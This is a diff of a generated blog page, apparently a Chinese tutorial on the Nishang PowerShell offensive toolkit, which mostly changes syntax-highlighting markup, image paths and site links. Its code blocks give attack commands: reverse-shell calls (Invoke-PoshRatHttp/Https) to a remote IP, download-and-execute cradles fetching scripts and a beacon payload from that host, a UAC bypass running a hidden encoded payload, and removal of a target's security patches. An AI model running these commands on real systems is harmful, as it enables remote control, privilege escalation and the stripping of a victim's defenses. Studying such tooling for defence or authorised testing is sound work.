+<p><img src="/2022/06/15/nishang%E5%AD%A6%E4%B9%A0/nishang%E5%AD%A6%E4%B9%A0/image-20240107175938290.png" srcset="/img/loading.gif" lazyload alt="image-20240107175938290"></p>
 <ul>
 <li><strong>Invoke-PoshRatHttp和Invoke-PoshRatHttps</strong></li>
 </ul>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">HTTP</span>：    Invoke-PoshRatHttp  -IPAddress  <span class="hljs-number">1.116.233.115</span> -Port <span class="hljs-number">3333</span><br><span class="hljs-attribute">HTTPS</span>： Invoke-PoshRatHttps  -IPAddress <span class="hljs-number">1.116.233.115</span> -Port <span class="hljs-number">3333</span><br><br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/9d4ddd4b01dc4a7098617004189405e4.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell">HTTP：    <span class="hljs-built_in">Invoke-PoshRatHttp</span>  <span class="hljs-literal">-IPAddress</span>  <span class="hljs-number">1.116</span>.<span class="hljs-number">233.115</span> <span class="hljs-literal">-Port</span> <span class="hljs-number">3333</span><br>HTTPS： <span class="hljs-built_in">Invoke-PoshRatHttps</span>  <span class="hljs-literal">-IPAddress</span> <span class="hljs-number">1.116</span>.<span class="hljs-number">233.115</span> <span class="hljs-literal">-Port</span> <span class="hljs-number">3333</span><br><br></code></pre></td></tr></table></figure>
+<p><img src="/2022/06/15/nishang%E5%AD%A6%E4%B9%A0/nishang%E5%AD%A6%E4%B9%A0/image-20240107175951060.png" srcset="/img/loading.gif" lazyload alt="image-20240107175951060"></p>
 <h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><ul>
 <li><strong>下载执行</strong><br>Download_Execute是Nishang中下载执行脚本</li>
 </ul>
 <p>ExetoText</p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment">#将exe转成txt</span><br>ExetoText becone.exe  c:\becone.txt<br><br>powershell -nop -c <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Utility/ExetoText.ps1&#x27;)&quot;</span>;ExetoText D:\tool\beacon.exe  D:\becone.txt<br><span class="hljs-comment">#下载并执行</span><br>Download_Execute http:<span class="hljs-regexp">//</span><span class="hljs-number">1.116</span>.<span class="hljs-number">233.115</span>/becone.txt<br><br>powershell -nop -c <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Execution/Download_Execute.ps1&#x27;)&quot;</span>;;Download_Execute http:<span class="hljs-regexp">//</span><span class="hljs-number">1.116</span>.<span class="hljs-number">233.115</span>/becone.txt<br></code></pre></td></tr></table></figure>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">#将exe转成txt</span><br>ExetoText becone.exe  c:\becone.txt<br><br>powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Utility/ExetoText.ps1&#x27;)&quot;</span>;ExetoText D:\tool\beacon.exe  D:\becone.txt<br><span class="hljs-comment">#下载并执行</span><br>Download_Execute http://<span class="hljs-number">1.116</span>.<span class="hljs-number">233.115</span>/becone.txt<br><br>powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Execution/Download_Execute.ps1&#x27;)&quot;</span>;;Download_Execute http://<span class="hljs-number">1.116</span>.<span class="hljs-number">233.115</span>/becone.txt<br></code></pre></td></tr></table></figure>
 
 <ul>
 <li><strong>Bypass UAC</strong></li>
 </ul>
-<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">#使用sysprp方法执行默认的payload<br>Invoke-PsUACme  -Verbose    <br>#使用oobe方法并执行默认的payload<br>Invoke-PsUACme  -<span class="hljs-keyword">method</span> <span class="hljs-title function_">oobe</span> -<span class="hljs-title function_">Verbose</span><br>#使用-<span class="hljs-title function_">Payload</span>参数可以自行指定执行的<span class="hljs-title function_">payload</span><br><span class="hljs-title function_">Invoke</span>-<span class="hljs-title function_">PsUACme</span>  -<span class="hljs-title function_">method</span> <span class="hljs-title function_">oobe</span> -<span class="hljs-title function_">Payload</span> &quot;<span class="hljs-title function_">powershell</span> -<span class="hljs-title function_">windowstyle</span> <span class="hljs-title function_">hidden</span> -<span class="hljs-title function_">e</span> <span class="hljs-title function_">Your</span> <span class="hljs-title function_">EncodedPayload</span>&quot;<br><br><span class="hljs-title function_">powershell</span> -<span class="hljs-title function_">nop</span> -<span class="hljs-title function_">c</span> &quot;<span class="hljs-title function_">iex</span><span class="hljs-params">(<span class="hljs-keyword">New</span>-Object Net.WebClient)</span>.<span class="hljs-title function_">DownloadString</span><span class="hljs-params">(<span class="hljs-string">&#x27;http://1.116.233.115/nishang/Escalation/Invoke-PsUACme.ps1&#x27;</span>)</span>&quot;;Invoke-PsUACme  -Verbose    <br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/034a7e7f479449f9a575333128944d3d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">#使用sysprp方法执行默认的payload</span><br><span class="hljs-built_in">Invoke-PsUACme</span>  <span class="hljs-literal">-Verbose</span>    <br><span class="hljs-comment">#使用oobe方法并执行默认的payload</span><br><span class="hljs-built_in">Invoke-PsUACme</span>  <span class="hljs-literal">-method</span> oobe <span class="hljs-literal">-Verbose</span><br><span class="hljs-comment">#使用-Payload参数可以自行指定执行的payload</span><br><span class="hljs-built_in">Invoke-PsUACme</span>  <span class="hljs-literal">-method</span> oobe <span class="hljs-literal">-Payload</span> <span class="hljs-string">&quot;powershell -windowstyle hidden -e Your EncodedPayload&quot;</span><br><br>powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Escalation/Invoke-PsUACme.ps1&#x27;)&quot;</span>;<span class="hljs-built_in">Invoke-PsUACme</span>  <span class="hljs-literal">-Verbose</span>    <br></code></pre></td></tr></table></figure>
+<p><img src="/2022/06/15/nishang%E5%AD%A6%E4%B9%A0/nishang%E5%AD%A6%E4%B9%A0/image-20240107180006584.png" srcset="/img/loading.gif" lazyload alt="image-20240107180006584"></p>
 <ul>
 <li><strong>删除补丁</strong></li>
 </ul>
-<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-type">#</span>移除目标机器上的所有更新补丁<br><span class="hljs-built_in">Remove</span><span class="hljs-operator">-</span><span class="hljs-built_in">Update</span> <span class="hljs-built_in">All</span><br><span class="hljs-type">#</span>移除目标机器上的所有与安全相关更新<br><span class="hljs-built_in">Remove</span><span class="hljs-operator">-</span><span class="hljs-built_in">Update</span> <span class="hljs-variable">Security</span><br><span class="hljs-type">#</span>移除指定编号的更新<br><span class="hljs-built_in">Remove</span><span class="hljs-operator">-</span><span class="hljs-built_in">Update</span> <span class="hljs-variable">KB2761226</span><br><br><span class="hljs-variable">powershell</span> <span class="hljs-operator">-</span><span class="hljs-variable">nop</span> <span class="hljs-operator">-</span><span class="hljs-variable">c</span> <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Escalation/Remove-Update.ps1&#x27;)&quot;</span><span class="hljs-operator">;</span><span class="hljs-built_in">Remove</span><span class="hljs-operator">-</span><span class="hljs-built_in">Update</span> <span class="hljs-variable">KB976902</span><br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/2cb9779e2f5d4a5fa515f621762f0f20.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">#移除目标机器上的所有更新补丁</span><br><span class="hljs-built_in">Remove-Update</span> All<br><span class="hljs-comment">#移除目标机器上的所有与安全相关更新</span><br><span class="hljs-built_in">Remove-Update</span> Security<br><span class="hljs-comment">#移除指定编号的更新</span><br><span class="hljs-built_in">Remove-Update</span> KB2761226<br><br>powershell <span class="hljs-literal">-nop</span> <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://1.116.233.115/nishang/Escalation/Remove-Update.ps1&#x27;)&quot;</span>;<span class="hljs-built_in">Remove-Update</span> KB976902<br></code></pre></td></tr></table></figure>
+<p><img src="/2022/06/15/nishang%E5%AD%A6%E4%B9%A0/nishang%E5%AD%A6%E4%B9%A0/image-20240107180022062.png" srcset="/img/loading.gif" lazyload alt="image-20240107180022062"></p>
 
               
             </div>
@@ -514,7 +514,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" class="category-chain-item">内网安全</a>
+  <a href="../../../../../categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" class="category-chain-item">内网安全</a>
   
   
 
@@ -529,9 +529,9 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/">#内网安全</a>
+        <a href="../../../../../tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/">#内网安全</a>
       
-        <a href="/tags/nishang/">#nishang</a>
+        <a href="../../../../../tags/nishang/">#nishang</a>
       
     </div>
   
@@ -586,9 +586,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2022/06/15/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/" title="端口转发">
+                      <a href="../../%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E9%9D%B6%E6%9C%BA%E4%BA%8C/index/" title="红日内网靶机二">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">端口转发</span>
+                        <span class="hidden-mobile">红日内网靶机二</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -596,7 +596,7 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/06/15/responder%E5%AD%A6%E4%B9%A0/responder%E5%AD%A6%E4%B9%A0/" title="responder学习">
+                      <a href="../../responder%E5%AD%A6%E4%B9%A0/responder%E5%AD%A6%E4%B9%A0/" title="responder学习">
                         <span class="hidden-mobile">responder学习</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
@@ -750,8 +750,8 @@
 
 <script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
 <script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
-<script  src="/js/events.js" ></script>
-<script  src="/js/plugins.js" ></script>
+<script  src="../../../../../js/events.js" ></script>
+<script  src="../../../../../js/plugins.js" ></script>
 
 
   <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
@@ -790,7 +790,7 @@
 
 
   
-    <script  src="/js/img-lazyload.js" ></script>
+    <script  src="../../../../../js/img-lazyload.js" ></script>
   
 
 
@@ -927,7 +927,7 @@
 
   <script>Fluid.plugins.imageCaption();</script>
 
-  <script  src="/js/local-search.js" ></script>
+  <script  src="../../../../../js/local-search.js" ></script>
 
 
 
@@ -935,7 +935,7 @@
 
 <!-- 主题的启动项，将它保持在最底部 -->
 <!-- the boot of the theme, keep it at the bottom -->
-<script  src="/js/boot.js" ></script>
+<script  src="../../../../../js/boot.js" ></script>
 
 
   
